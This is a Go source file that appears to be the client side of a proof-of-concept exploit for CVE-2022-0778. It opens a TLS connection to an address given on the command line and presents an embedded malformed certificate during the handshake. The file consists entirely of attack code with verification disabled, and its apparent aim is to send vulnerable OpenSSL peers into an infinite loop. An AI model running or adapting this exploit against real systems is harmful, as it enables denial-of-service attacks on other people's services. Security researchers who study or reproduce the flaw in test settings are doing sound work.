package main

import (
	"cve-2022-0778/certfile"
	"cve-2022-0778/tls"
	_ "embed"
	"flag"
	"fmt"
	"net"
	"time"
)

var (
	addr    string
	network string
)

func Init() {
	flag.StringVar(&network, "network", "tcp", "tcp/udp")
	flag.StringVar(&addr, "addr", "127.0.0.1:12345", "addr")
}

func main() {
	cert, err := tls.X509KeyPair(certfile.Cert, certfile.Key)
	if err != nil {
		fmt.Println(err)
		return
	}
	cert.Certificate = [][]byte{certfile.BadCert}
	config := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MaxVersion:   tls.VersionTLS12,
		GetClientCertificate: func(*tls.CertificateRequestInfo) (*tls.Certificate, error) {
			return &cert, nil
		},
		InsecureSkipVerify: true,
	}

	// 初始化变量 cliFlag
	Init()
	// 把用户传递的命令行参数解析为对应变量的值
	flag.Parse()

	conn, err := net.DialTimeout(network, addr, 5*time.Second)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer conn.Close()

	tlsConn := tls.Client(conn, config)
	_ = tlsConn.Handshake()
	fmt.Println("send bad cert")
}
